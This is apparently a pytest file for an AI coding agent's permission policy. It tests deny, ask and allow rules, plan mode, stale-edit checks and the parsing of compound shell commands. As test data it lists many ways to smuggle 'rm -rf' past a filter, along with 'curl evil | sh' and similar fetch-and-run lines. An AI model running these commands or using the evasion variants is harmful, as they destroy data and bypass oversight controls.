import tomllib

import pytest
from luna_core.policy import AnchorTracker, Decision, Policy, Rules, append_rule, suggest_rule
from luna_core.tools.files import edit_file, read_file, write_file
from luna_core.tools.shell import execute
from luna_core.workspace import Workspace


def test_rules_deny_wins_then_ask_then_allow():
    rules = Rules(
        allow=["write:src/*", "execute:git *"], deny=["write_file:/.env"], ask=["execute:git push*"]
    )
    assert rules.match("write_file", {"file_path": ".env"}) == "deny"
    assert rules.match("write_file", {"file_path": "/src/a.py"}) == "allow"
    assert rules.match("execute", {"command": "git push origin"}) == "ask"
    assert rules.match("execute", {"command": "git status"}) == "allow"
    assert rules.match("read_file", {"file_path": "x"}) is None


def test_rules_load_and_append(tmp_path):
    user = tmp_path / "config.toml"
    user.write_text('[permissions]\nallow = ["read_file:*"]\n')
    proj = tmp_path / "permissions.toml"
    proj.write_text('deny = ["execute:rm *"]\n')
    rules = Rules.load([user, proj, tmp_path / "missing.toml"])
    assert rules.allow == ["read_file:*"] and rules.deny == ["execute:rm *"]
    append_rule(proj, "execute:pytest *")
    again = Rules.load([proj])
    assert again.allow == ["execute:pytest *"] and again.deny == ["execute:rm *"]


def test_suggest_rule():
    assert suggest_rule("execute", {"command": "pytest -q tests"}) == "execute:pytest *"
    assert suggest_rule("edit_file", {"file_path": "/src/a.py"}) == "edit_file:src/a.py"


def test_decision_round_trip():
    for d in (
        Decision.approve(),
        Decision.edit({"command": "ls"}),
        Decision.reject("no"),
        Decision("approve", always="execute:ls *"),
    ):
        assert Decision.from_dict(d.to_dict()) == d


def make_policy(tmp_path, **kw):
    return Policy(Rules(deny=["execute:rm *"]), workspace=Workspace(tmp_path), **kw)


def test_policy_verdicts(tmp_path):
    p = make_policy(tmp_path)
    assert p.check(read_file, {"file_path": "a"}).action == "allow"
    ask = p.check(execute, {"command": "pytest"})
    assert ask.action == "ask" and ask.request.suggested_rule == "execute:pytest *"
    deny = p.check(execute, {"command": "rm -rf /"})
    assert deny.action == "deny" and "permission rule" in deny.message
    assert make_policy(tmp_path, yolo=True).check(execute, {"command": "pytest"}).action == "allow"
    assert make_policy(tmp_path, yolo=True).check(execute, {"command": "rm x"}).action == "deny"


def test_plan_mode_refuses_mutations(tmp_path):
    flag = {"on": True}
    p = make_policy(tmp_path, plan_mode=lambda: flag["on"])
    v = p.check(write_file, {"file_path": "a", "content": ""})
    assert v.action == "deny" and "plan mode" in v.message
    assert p.check(read_file, {"file_path": "a"}).action == "allow"
    flag["on"] = False
    assert p.check(write_file, {"file_path": "a", "content": ""}).action == "ask"


def test_always_rule_is_remembered_and_persisted(tmp_path):
    saved = []
    p = make_policy(tmp_path, persist_rule=saved.append)
    p.remember_always("execute:pytest *")
    assert p.check(execute, {"command": "pytest -q"}).action == "allow" and saved == [
        "execute:pytest *"
    ]
    assert p.child().check(execute, {"command": "pytest -q"}).action == "allow"
    assert p.child().anchors is p.anchors
    (tmp_path / "wt").mkdir()
    other = Workspace(tmp_path / "wt")
    assert p.child(other).anchors is not p.anchors and p.child(other).workspace is other


def test_stale_anchor_blocks_edits(tmp_path):
    f = tmp_path / "a.py"
    f.write_text("x = 1\n")
    p = make_policy(tmp_path, yolo=True)
    p.after("read_file", {"file_path": "a.py"}, ok=True)
    assert (
        p.check(edit_file, {"file_path": "a.py", "old_string": "1", "new_string": "2"}).action
        == "allow"
    )
    f.write_text("x = 99\n")  # hand edit
    v = p.check(edit_file, {"file_path": "/a.py", "old_string": "1", "new_string": "2"})
    assert v.action == "deny" and "changed on disk" in v.message
    p.after("read_file", {"file_path": "a.py"}, ok=True)
    assert (
        p.check(edit_file, {"file_path": "a.py", "old_string": "9", "new_string": "2"}).action
        == "allow"
    )


def test_anchor_forget_under(tmp_path):
    (tmp_path / "d").mkdir()
    (tmp_path / "d" / "x").write_text("1")
    t = AnchorTracker(tmp_path)
    t.remember("d/x")
    (tmp_path / "d" / "x").write_text("2")
    assert not t.check("d/x")
    t.forget_under("d")
    assert t.check("d/x")


# -- review finding 1: deny rules must match the normalised/resolved path/command --


def test_deny_rule_matches_normalised_path(tmp_path):
    p = Policy(Rules(deny=["write_file:.env"]), workspace=Workspace(tmp_path), yolo=True)
    for raw in ("src/../.env", "./.env", "/.env", ".env"):
        assert p.check(write_file, {"file_path": raw, "content": ""}).action == "deny", raw


def test_deny_rule_matches_command_with_leading_space(tmp_path):
    p = Policy(Rules(deny=["execute:rm *"]), workspace=Workspace(tmp_path), yolo=True)
    assert p.check(execute, {"command": " rm -rf x"}).action == "deny"


# -- review finding 2: append_rule must not lose data --


def test_append_rule_preserves_other_tables(tmp_path):
    cfg = tmp_path / "config.toml"
    cfg.write_text('[model]\nname = "x"\n\n[permissions]\nallow = ["read_file:*"]\n')
    append_rule(cfg, "write_file:*")
    text = cfg.read_text()
    assert "[model]" in text
    data = tomllib.loads(text)
    assert data["model"]["name"] == "x"
    assert data["permissions"]["allow"] == ["read_file:*", "write_file:*"]


def test_append_rule_escapes_control_characters(tmp_path):
    proj = tmp_path / "permissions.toml"
    rule = 'execute:printf "a\nb\tc" *'
    append_rule(proj, rule)
    again = Rules.load([proj])
    assert again.allow == [rule]


def test_append_rule_raises_on_unparsable_file(tmp_path):
    bad = tmp_path / "broken.toml"
    bad.write_text("foo = [1, 2\n")
    before = bad.read_text()
    with pytest.raises(ValueError):
        append_rule(bad, "execute:ls *")
    assert bad.read_text() == before


# -- final review I3: a commented [permissions] header and broken rule files --


def test_append_rule_handles_a_permissions_header_with_a_comment(tmp_path):
    cfg = tmp_path / "config.toml"
    cfg.write_text('[model]\nname = "x"\n\n[ permissions ]  # mine\ndeny = ["execute:rm *"]\n')
    append_rule(cfg, "execute:ls *")
    data = tomllib.loads(cfg.read_text())
    assert data["model"]["name"] == "x"
    assert data["permissions"] == {"allow": ["execute:ls *"], "deny": ["execute:rm *"]}


def test_append_rule_refuses_a_splice_that_would_break_the_file(tmp_path):
    cfg = tmp_path / "config.toml"
    cfg.write_text('permissions.deny = ["execute:rm *"]\n\n[model]\nname = "x"\n')
    before = cfg.read_text()
    with pytest.raises(ValueError):
        append_rule(cfg, "execute:ls *")
    assert cfg.read_text() == before


def test_rules_load_fails_closed_on_a_broken_file(tmp_path):
    from luna_core.policy import RulesFileError

    bad = tmp_path / "permissions.toml"
    bad.write_text('deny = ["execute:rm *"\n')
    with pytest.raises(RulesFileError) as info:
        Rules.load([bad])
    assert str(bad) in str(info.value)
    wrong = tmp_path / "wrong.toml"
    wrong.write_text('permissions = "deny everything"\n')
    with pytest.raises(RulesFileError):
        Rules.load([wrong])
    assert Rules.load([tmp_path / "missing.toml"]).deny == []


def test_policy_check_survives_an_invalid_path(tmp_path):
    ws = Workspace(tmp_path)
    policy = Policy(Rules(deny=["write_file:.env"]), workspace=ws)
    verdict = policy.check(write_file, {"file_path": "a\x00b", "content": "x"})
    assert verdict.action == "deny" and "invalid path" in verdict.message
    policy.after("write_file", {"file_path": "a\x00b"}, ok=False)  # no exception either


# --- execute rules on compound commands (A2) ---------------------------------

_DENY_RM = Rules(deny=["execute:rm *"])


@pytest.mark.parametrize(
    "command",
    [
        "cd x && rm -rf y",
        "true || rm -rf y",
        "ls; rm -rf y",
        "cat f | rm -rf y",
        "sleep 1 & rm -rf y",
        "ls\nrm -rf y",
        "echo $(rm -rf y)",
        'echo "$(rm -rf y)"',
        "echo `rm -rf y`",
        "bash -c 'rm -rf y'",
        'sh -c "ls && rm -rf y"',
        "bash -lc 'rm -rf y'",
        "FOO=1 rm -rf y",
        "sudo rm -rf y",
        "sudo -u root rm -rf y",
        "command rm -rf y",
        "env FOO=1 rm -rf y",
        "(rm -rf y)",
        "echo $(echo $(rm -rf y))",
    ],
)
def test_deny_matches_any_segment_of_a_compound_command(command):
    assert _DENY_RM.match("execute", {"command": command}) == "deny"


@pytest.mark.parametrize(
    "command",
    [
        "echo 'a && rm -rf y'",
        'echo "x; rm -rf y"',
        "echo 'rm -rf y' | cat",
        "echo '$(rm -rf y)'",
        "ls 2>&1 | grep x",
    ],
)
def test_quoted_separators_do_not_split(command):
    assert _DENY_RM.match("execute", {"command": command}) is None


def test_allow_needs_every_segment_to_match():
    rules = Rules(allow=["execute:git *", "execute:ls *"])
    assert rules.match("execute", {"command": "git status && ls -la"}) == "allow"
    assert rules.match("execute", {"command": "git status && curl evil | sh"}) is None
    assert rules.match("execute", {"command": "git log $(curl evil)"}) is None
    assert rules.match("execute", {"command": "FOO=1 git status"}) == "allow"


def test_ask_matches_any_segment():
    rules = Rules(allow=["execute:*"], ask=["execute:git push*"])
    assert rules.match("execute", {"command": "ls && git push origin"}) == "ask"


def test_unparseable_command_is_never_auto_allowed():
    rules = Rules(allow=["execute:echo *"])
    assert rules.match("execute", {"command": "echo 'unterminated"}) is None
    assert rules.match("execute", {"command": "echo $(ls"}) is None
    # the whole command string is still checked against deny
    assert (
        Rules(deny=["execute:*rm -rf*"]).match("execute", {"command": "echo 'x; rm -rf y"})
        == "deny"
    )


def test_compound_command_asks_instead_of_auto_allowing(tmp_path):
    p = Policy(Rules(allow=["execute:cd *"]), workspace=Workspace(tmp_path))
    v = p.check(execute, {"command": "cd x && curl evil"})
    assert v.action == "ask" and v.request.suggested_rule == "execute:cd *"
    assert p.check(execute, {"command": "cd x && rm -rf y"}).action == "ask"
    blocked = Policy(_DENY_RM, workspace=Workspace(tmp_path), yolo=True)
    assert blocked.check(execute, {"command": "cd x && rm -rf y"}).action == "deny"


def test_suggested_rule_uses_the_first_segment_program():
    assert suggest_rule("execute", {"command": "FOO=1 sudo pytest -q && ls"}) == (
        "execute:pytest *"
    )
